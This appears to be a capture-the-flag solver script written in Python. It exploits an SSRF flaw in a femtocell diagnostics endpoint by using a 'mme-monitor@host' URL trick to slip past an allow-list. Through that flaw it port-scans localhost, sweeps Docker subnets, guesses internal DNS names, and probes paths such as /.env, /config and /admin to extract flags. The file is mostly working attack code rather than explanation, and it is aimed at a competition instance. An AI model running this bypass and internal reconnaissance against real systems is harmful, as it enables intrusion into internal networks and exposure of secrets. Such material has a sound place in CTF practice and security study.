#!/usr/bin/env python3
import concurrent.futures
import json
import os
import re
import ssl
import time
import urllib.error
import urllib.parse
import urllib.request

HOST = "9taux6shw8cpbvs5.instances.ctfcup.online"
BASE = f"http://{HOST}"
OUT = "/tmp/web-out"
os.makedirs(OUT, exist_ok=True)
ctx = ssl._create_unverified_context()
UA = "Mozilla/5.0 (X11; Linux x86_64) ssrf-scan"
FLAG_RE = re.compile(r"ctfcup\{[^}]+\}")

# A no-redirect opener for outer calls.  The vulnerable server endpoint itself
# follows redirects when fetching the SSRF target.
class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

opener = urllib.request.build_opener(NoRedirect, urllib.request.HTTPSHandler(context=ctx))
all_records = []


def call_ssrf(target, timeout=10):
    """Ask the femtocell connectivity-test URL parser bypass to fetch target."""
    q = urllib.parse.urlencode({"target": target})
    url = f"{BASE}/api/diagnostics/connectivity-test?{q}"
    req = urllib.request.Request(url, headers={"User-Agent": UA, "Accept": "application/json"})
    started = time.time()
    try:
        with opener.open(req, timeout=timeout) as r:
            raw = r.read(1_000_000)
            outer_status = r.status
    except urllib.error.HTTPError as e:
        raw = e.read(1_000_000)
        outer_status = e.code
    except Exception as e:
        return {
            "target": target,
            "kind": "outer-error",
            "error": f"{type(e).__name__}: {e}",
            "elapsed": round(time.time() - started, 3),
        }
    elapsed = round(time.time() - started, 3)
    try:
        data = json.loads(raw.decode("utf-8", "replace"))
    except Exception:
        return {
            "target": target,
            "kind": "outer-nonjson",
            "outer_status": outer_status,
            "body": raw[:4000].decode("utf-8", "replace"),
            "elapsed": elapsed,
        }
    if "body" in data or isinstance(data.get("status"), int):
        kind = "http"
    else:
        err = str(data.get("error", ""))
        if "Connection refused" in err:
            kind = "refused"
        elif "name resolution" in err or "Name or service not known" in err:
            kind = "dns"
        elif "timed out" in err:
            kind = "timeout"
        elif "No route to host" in err:
            kind = "noroute"
        elif "Connection reset" in err or "Remote end closed" in err or "EOF" in err:
            kind = "reset"
        else:
            kind = "error"
    result = {
        "target": target,
        "kind": kind,
        "outer_status": outer_status,
        "elapsed": elapsed,
        **data,
    }
    # Avoid retaining gigantic bodies in jsonl history; caller summarizes.
    if isinstance(result.get("body"), str) and len(result["body"]) > 20000:
        result["body"] = result["body"][:20000]
        result["body_truncated"] = True
    return result


def ssrf_host_port(host, port, path="/", scheme="http"):
    # The bypass: the allow-list sees the mme-monitor prefix, urllib uses
    # the host after the final @.
    return call_ssrf(f"{scheme}://mme-monitor@{host}:{port}{path}")


def interesting(rec):
    return rec.get("kind") not in {"refused", "dns", "noroute"}


def short_body(rec, limit=1600):
    body = rec.get("body", "")
    if not isinstance(body, str):
        body = str(body)
    return body[:limit].replace("\r", "\\r")


def run_map(jobs, fn, workers=20, label="scan"):
    results = []
    started = time.time()
    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
        futs = {ex.submit(fn, job): job for job in jobs}
        done = 0
        for fut in concurrent.futures.as_completed(futs):
            done += 1
            try:
                rec = fut.result()
            except Exception as e:
                rec = {"target": str(futs[fut]), "kind": "worker-error", "error": repr(e)}
            rec["phase"] = label
            results.append(rec)
            all_records.append(rec)
            if done % 250 == 0 or done == len(jobs):
                print(f"[{label}] {done}/{len(jobs)} in {time.time()-started:.1f}s", flush=True)
    return results


summary = []

def add_section(title, lines):
    summary.append(f"\n===== {title} =====\n" + "\n".join(lines))

# Phase 0: sanity and a few obvious internal names/addresses.
sanity_targets = [
    "http://mme-monitor:8081/health",
    "http://mme-monitor@127.0.0.1:8080/health",
    "http://mme-monitor@127.0.0.1:8080/",
    "http://mme-monitor@172.17.0.1:8080/health",
    "http://mme-monitor@172.18.0.1:8080/health",
    "http://mme-monitor@172.18.0.2:8080/health",
]
lines = []
for target in sanity_targets:
    rec = call_ssrf(target)
    rec["phase"] = "sanity"
    all_records.append(rec)
    lines.append(json.dumps(rec, ensure_ascii=False)[:5000])
add_section("SANITY", lines)

# Phase 1: localhost common/full-ish port scan. Closed ports should return
# refused quickly through the SSRF; any HTTP/reset/timeout is reported.
localhost_ports = list(range(1, 12001)) + [
    12001, 12100, 12200, 12345, 12443, 13000, 14000, 15000, 15672, 16000,
    16992, 18080, 18081, 18082, 19000, 20000, 21000, 22000, 23000, 24000,
    25000, 27017, 28015, 30000, 31000, 32000, 32768, 32769, 33000, 34000,
    35000, 36412, 38080, 40000, 42000, 45000, 48080, 50000, 50070, 50075,
    54321, 58080, 60000, 61616, 62000, 65000,
]
localhost_ports = sorted(set(localhost_ports))
local_results = run_map(
    localhost_ports,
    lambda p: ssrf_host_port("127.0.0.1", p, "/"),
    workers=24,
    label="localhost-ports",
)
local_hits = [r for r in local_results if interesting(r)]
local_hits.sort(key=lambda r: r["target"])
add_section(
    "LOCALHOST INTERESTING PORTS",
    [json.dumps(r, ensure_ascii=False)[:5000] for r in local_hits] or ["(none)"],
)

# Phase 2: host discovery in the two subnets already observed. Refused means
# a live IP (closed 8080); HTTP means a live service. Nonexistent Docker
# bridge addresses normally time out.
candidate_subnets = ["172.18.0", "172.17.0"]
discovery_jobs = [(f"{subnet}.{i}", 8080) for subnet in candidate_subnets for i in range(1, 255)]
discovery = run_map(
    discovery_jobs,
    lambda hp: ssrf_host_port(hp[0], hp[1], "/health"),
    workers=24,
    label="subnet-discovery",
)
live_hosts = set()
for rec in discovery:
    if rec.get("kind") in {"http", "refused", "reset"}:
        # Extract IP from the actual authority after @.
        target = rec.get("target", "")
        m = re.search(r"@(\d+\.\d+\.\d+\.\d+):", target)
        if m:
            live_hosts.add(m.group(1))
live_hosts.update({"127.0.0.1", "172.17.0.1", "172.18.0.1"})
add_section(
    "LIVE HOSTS (from refused/http/reset on 8080)",
    [
        ", ".join(sorted(live_hosts, key=lambda x: tuple(map(int, x.split('.'))))) or "(none)",
        *[json.dumps(r, ensure_ascii=False)[:3000] for r in discovery if r.get("kind") in {"http", "reset"}],
    ],
)

# Phase 3: useful port scan on live hosts other than loopback (loopback was
# already scanned much more deeply).  Include 1..12000 for each genuinely
# distinct remote-looking live host, but cap the number of such hosts.
remote_live = [h for h in sorted(live_hosts, key=lambda x: tuple(map(int, x.split('.')))) if h != "127.0.0.1"]
# Safety cap: if the bridge unexpectedly answers for every address, scan the
# low addresses where containers are normally allocated first.
if len(remote_live) > 24:
    print(f"capping remote_live from {len(remote_live)} to 24", flush=True)
    remote_live = remote_live[:24]
# 172.17.0.1 / 172.18.0.1 are probably local interfaces of the same VM, but
# services may bind one interface only; the top-port list below catches that.
top_ports = sorted(set([
    21,22,23,25,53,69,80,81,88,110,111,123,135,139,143,161,389,443,445,465,
    514,587,623,631,993,995,1025,1080,1194,1433,1521,1723,1883,2049,2123,
    2181,2222,2375,2376,3000,3128,3306,3389,3868,4369,5000,5001,5044,5060,
    5432,5672,5900,6000,6379,6443,7000,7001,7070,7500,8000,8001,8008,8009,
    8025,8060,8070,8080,8081,8082,8083,8084,8085,8086,8087,8088,8089,8090,
    8100,8123,8181,8200,8222,8280,8333,8443,8500,8888,9000,9001,9002,9003,
    9004,9005,9006,9007,9008,9009,9010,9042,9090,9091,9092,9093,9100,9200,
    9300,10000,10250,11211,15672,27017,36412,61616,
] + list(range(8070, 8131)) + list(range(8990, 9121))))
remote_jobs = [(h, p) for h in remote_live for p in top_ports]
remote_results = []
if remote_jobs:
    remote_results = run_map(
        remote_jobs,
        lambda hp: ssrf_host_port(hp[0], hp[1], "/"),
        workers=24,
        label="live-host-top-ports",
    )
remote_hits = [r for r in remote_results if interesting(r)]
remote_hits.sort(key=lambda r: r["target"])
add_section(
    "LIVE HOST INTERESTING TOP PORTS",
    [json.dumps(r, ensure_ascii=False)[:5000] for r in remote_hits] or ["(none)"],
)

# Phase 4: DNS candidate names. A refused response is enough to prove a name
# resolves. This catches /etc/hosts names even though ordinary Docker DNS
# names failed.
base_names = {
    "mme", "mme-monitor", "mme_monitor", "monitor", "monitoring", "femto",
    "femtocell", "femtocell-web", "femto-web", "web", "panel", "console",
    "field-support", "field_support", "support", "support-dispatch",
    "dispatch", "field", "field-service", "service", "services",
    "maintenance", "maint", "ticket", "tickets", "ticket-service",
    "ticket-dispatch", "helpdesk", "noc", "ops", "operator", "core",
    "core-network", "epc", "lte", "enb", "enodeb", "henb", "s1", "s1ap",
    "s1-mme", "s1u", "NAS", "emm", "esm", "hss", "sgw", "pgw", "spgw",
    "diameter", "radius", "aaa", "subscriber", "session", "sessions",
    "session-echo", "echo", "echo-service", "legacy", "legacy-session",
    "old-session", "old-sessions", "ghost", "memory", "trace", "traces",
    "backhaul", "management", "mgmt", "internal", "private", "closed",
    "api", "backend", "server", "gateway", "gw", "proxy", "relay",
    "signaling", "signalling", "control", "controller", "agent", "node",
    "cell", "radio", "ran", "oam", "tr069", "acs", "cwmp", "provisioning",
    "auth", "identity", "subscriber-db", "db", "database", "redis",
    "postgres", "mysql", "mongo", "queue", "broker", "log", "logs",
    "collector", "probe", "diagnostics", "diag", "health", "status",
}
suffixes = ["", ".local", ".lan", ".internal", ".localdomain", ".home", ".docker", ".svc", ".cluster.local"]
# Only test suffix variants for the most topical names to bound the scan.
topical = {
    "mme", "mme-monitor", "femtocell-web", "field-support", "support",
    "dispatch", "maintenance", "ticket", "echo", "session-echo", "legacy",
    "s1ap", "core", "hss", "backhaul", "management", "internal", "api",
}
names = set(base_names)
for n in topical:
    for suf in suffixes:
        names.add(n + suf)
dns_jobs = sorted(names)
dns_results = run_map(
    dns_jobs,
    lambda n: ssrf_host_port(n, 8080, "/health"),
    workers=20,
    label="dns-names",
)
dns_hits = [r for r in dns_results if r.get("kind") != "dns"]
dns_hits.sort(key=lambda r: r["target"])
add_section(
    "DNS NAMES THAT RESOLVE (8080)",
    [json.dumps(r, ensure_ascii=False)[:5000] for r in dns_hits] or ["(none)"],
)

# Phase 5: for every HTTP-looking open endpoint discovered, fetch a compact
# route set. This includes localhost:8080 (the web app itself), which can
# reveal local-only endpoints under /internal/.
open_endpoints = set()
for rec in local_hits + remote_hits + dns_hits + discovery:
    if rec.get("kind") != "http":
        continue
    target = rec.get("target", "")
    parsed = urllib.parse.urlparse(target)
    if parsed.hostname and parsed.port:
        open_endpoints.add((parsed.hostname, parsed.port, parsed.scheme))
# Always inspect loopback app and the gateway-looking interfaces.
open_endpoints.update({
    ("127.0.0.1", 8080, "http"),
    ("172.17.0.1", 8080, "http"),
    ("172.18.0.1", 8080, "http"),
})
paths = [
    "/", "/health", "/healthz", "/ready", "/status", "/info", "/version",
    "/robots.txt", "/openapi.json", "/swagger.json", "/docs", "/redoc",
    "/api", "/api/", "/api/health", "/api/status", "/api/info", "/api/docs",
    "/api/openapi.json", "/internal/", "/internal", "/internal/health",
    "/internal/status", "/internal/api", "/internal/api/", "/internal/ticket",
    "/internal/tickets", "/internal/maintenance", "/internal/support",
    "/internal/dispatch", "/internal/session", "/internal/sessions",
    "/internal/echo", "/maintenance", "/ticket", "/tickets", "/api/ticket",
    "/api/tickets", "/api/tickets/active", "/api/maintenance/ticket",
    "/api/maintenance/tickets", "/api/support/tickets", "/api/dispatch/tickets",
    "/support", "/support/tickets", "/dispatch", "/dispatch/tickets",
    "/session", "/sessions", "/echo", "/mme", "/s1", "/s1ap", "/NAS",
    "/debug", "/metrics", "/config", "/env", "/.env", "/flag", "/admin",
]
endpoint_jobs = [(h, p, s, path) for (h, p, s) in sorted(open_endpoints) for path in paths]
endpoint_results = run_map(
    endpoint_jobs,
    lambda j: ssrf_host_port(j[0], j[1], j[3], j[2]),
    workers=20,
    label="open-endpoint-paths",
)

def path_is_interesting(rec):
    if rec.get("kind") != "http":
        return rec.get("kind") not in {"refused", "dns", "noroute"}
    body = rec.get("body", "") or ""
    status = rec.get("status")
    # Generic Flask/Werkzeug 404s are noise unless they contain clues.
    if status == 404 and "The requested URL was not found" in body:
        return False
    if status in {404, 405} and len(body) < 250 and not FLAG_RE.search(body):
        # Still keep short API errors only when they are not the standard body.
        return "Not Found" not in body and "Method Not Allowed" not in body
    return True

endpoint_hits = [r for r in endpoint_results if path_is_interesting(r)]
endpoint_hits.sort(key=lambda r: (r.get("target", ""), str(r.get("status", ""))))
lines = []
for rec in endpoint_hits:
    lines.append(
        f"{rec.get('target')} kind={rec.get('kind')} status={rec.get('status')} "
        f"elapsed={rec.get('elapsed')} error={rec.get('error','')}\n{short_body(rec, 2500)}\n---"
    )
add_section("OPEN ENDPOINT PATH HITS", lines or ["(none)"])

# Flag extraction anywhere in retained records.
flags = sorted(set(FLAG_RE.findall(json.dumps(all_records, ensure_ascii=False))))
add_section("FLAGS", flags or ["(none found)"])

with open(os.path.join(OUT, "SUMMARY2.txt"), "w", encoding="utf-8") as f:
    f.write("\n".join(summary))
with open(os.path.join(OUT, "scan.jsonl"), "w", encoding="utf-8") as f:
    for rec in all_records:
        f.write(json.dumps(rec, ensure_ascii=False) + "\n")
print(f"records={len(all_records)} flags={flags}")
